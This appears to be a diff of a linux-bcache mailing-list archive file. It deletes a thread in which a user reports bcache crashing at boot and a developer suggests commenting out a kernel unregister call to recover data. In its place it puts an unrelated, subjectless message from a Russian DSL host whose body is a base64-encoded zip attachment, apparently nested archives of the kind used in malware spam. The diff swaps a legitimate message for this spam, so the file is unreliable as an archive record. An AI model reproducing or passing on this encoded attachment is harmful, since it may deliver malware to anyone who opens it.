@@ -1,83 +1,80 @@
-From: Eric Wheeler <bcache@lists.ewheeler.net>
-Subject: Re: bcache crashes at boot time
-Date: Tue, 20 Jun 2017 22:04:40 +0000 (UTC)
-Message-ID: <alpine.LRH.2.11.1706202158180.17052@mail.ewheeler.net>
-References: <CAE4BCM2DCZ5E29AbXmDwn8T3VBzUczLZa+CXkYVH_dZNrcqVeA@mail.gmail.com>
+From: <kholloway@isd622.org>
+Subject: (unknown)
+Date: Wed, 21 Jun 2017 04:40:25 -0000
+Message-ID: <149802002507.29695.8475497068656608903@surnet.ru>
 Mime-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
+Content-Type: application/zip; name="5342408615.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-bcache-owner@vger.kernel.org>
-Received: from mx.ewheeler.net ([66.155.3.69]:45860 "EHLO mail.ewheeler.net"
-        rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with ESMTP
-        id S1752925AbdFTWEl (ORCPT <rfc822;linux-bcache@vger.kernel.org>);
-        Tue, 20 Jun 2017 18:04:41 -0400
-In-Reply-To: <CAE4BCM2DCZ5E29AbXmDwn8T3VBzUczLZa+CXkYVH_dZNrcqVeA@mail.gmail.com>
+Received: from ip-90-151-227-133.dsl.surnet.ru ([90.151.227.133]:37269 "HELO
+        surnet.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750707AbdFUEka (ORCPT <rfc822;linux-bcache@vger.kernel.org>);
+        Wed, 21 Jun 2017 00:40:30 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-bcache-owner@vger.kernel.org
 List-Id: linux-bcache@vger.kernel.org
-To: Igor Pavlenko <ipavlenko.mail@gmail.com>
-Cc: linux-bcache@vger.kernel.org
+To: linux-bcache@vger.kernel.org
 
-On Mon, 5 Jun 2017, Igor Pavlenko wrote:
-
-> Hi
-> 
-> Bcache crashes at boot time making root fs unavailable. Same error
-> occurs when I try to add caching and backing devices manually through
-> /sys/fs/bcache/register. I reproduced the error on ubuntu 17.04
-> (kernel 4.10.0) and fedora (4.4.67).
-> 
-> The cache was in writeback mode.
-> 
-> Is it possible to recover my data?
-> 
-> dmesg output:
-> 
-> [   45.941155] bcache: register_bdev() registered backing device sda3
-> [   46.138238] bcache: error on 471776aa-1b34-4eff-ba7d-509a9554b43d:
-> inconsistent ptrs: mark = 3, level = 0, disabling caching
-
-^^^
-
-This is the reason, something was inconsistent enough that it couldn't 
-continue.  
-
-Disclaimer: No promises here about data integrity, so backup the full 
-block device images first. This could cause more issues, but it might let 
-the device come up far enough to access your data:
-
-Near bcache/super.c:1315 You could try commenting out 
-`bch_cache_set_unregister(c);` at the bottom of `bch_cache_set_error()`.
-
-This won't fix the problem, but it would allow it to continue past the 
-error---or it might just error again somewhere else.
-
--Eric
-
-
-> [   46.139868] CPU: 0 PID: 1495 Comm: bcache-register Tainted: G     U
-> [   46.154267]  [<ffffffffc090ba34>]
-> __bch_btree_mark_key.part.23+0x244/0x270 [bcache]
-> [   46.156051]  [<ffffffffc090e3df>] bch_initial_mark_key+0xdf/0xf0 [bcache]
-> [   46.157744]  [<ffffffffc090e44c>] bch_btree_check_recurse+0x5c/0x230 [bcache]
-> [   46.159432]  [<ffffffffc090db2a>] ? bch_btree_node_get+0xba/0x280 [bcache]
-> [   46.160994]  [<ffffffffc090e51f>]
-> bch_btree_check_recurse+0x12f/0x230 [bcache]
-> [   46.162428]  [<ffffffffc0913738>] ? __bch_submit_bbio+0x58/0x60 [bcache]
-> [   46.163894]  [<ffffffffc090e800>] bch_btree_check+0x180/0x1d0 [bcache]
-> [   46.166862]  [<ffffffffc091d5d5>] run_cache_set+0x3b5/0x8e0 [bcache]
-> [   46.168399]  [<ffffffffc091ee47>] register_bcache+0xe07/0x11b0 [bcache]
-> [   47.182133] bcache: bch_journal_replay() journal replay done,
-> 237858 keys in 207 entries, seq 3687554
-> [   47.184437] bcache: bch_cached_dev_attach() Can't attach sda3: shutting down
-> [   47.186168] bcache: register_cache() registered cache device sdb1
-> [   47.187538] bcache: cache_set_free() Cache set
-> 471776aa-1b34-4eff-ba7d-509a9554b43d unregistered
-> 
-> 
-> -- 
-> Igor Pavlenko
-> ipavlenko.mail@gmail.com
-> --
-> To unsubscribe from this list: send the line "unsubscribe linux-bcache" in
-> the body of a message to majordomo@vger.kernel.org
-> More majordomo info at  http://vger.kernel.org/majordomo-info.html
-> 
+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
